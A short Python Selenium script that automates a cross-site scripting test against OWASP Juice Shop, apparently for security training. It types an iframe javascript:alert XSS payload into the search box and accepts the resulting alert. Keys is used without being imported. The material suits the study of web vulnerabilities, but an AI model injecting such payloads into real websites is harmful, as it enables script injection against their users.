from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
import os

try:
	IP_ADDRESS = os.environ['OWASP_JUICE_SHOP_IP_ADDRESS']
	PORT = os.environ['OWASP_JUICE_SHOP_PORT']
	driver = webdriver.Chrome()
	driver.get(f"http://{IP_ADDRESS}:{PORT}")

	#User inputs malicious JavaScript into search box
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Dismiss')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "searchQuery"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "mat-input-1"))).send_keys("<iframe src=\"javascript:alert('xss')\">")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "mat-input-1"))).send_keys(Keys.ENTER)
	# Wait for the alert to be present
	WebDriverWait(driver, 20).until(EC.alert_is_present())
	# Switch to the alert
	alert = driver.switch_to.alert
	# To accept the alert (click 'OK')
	alert.accept()
	
finally:
  driver.quit()
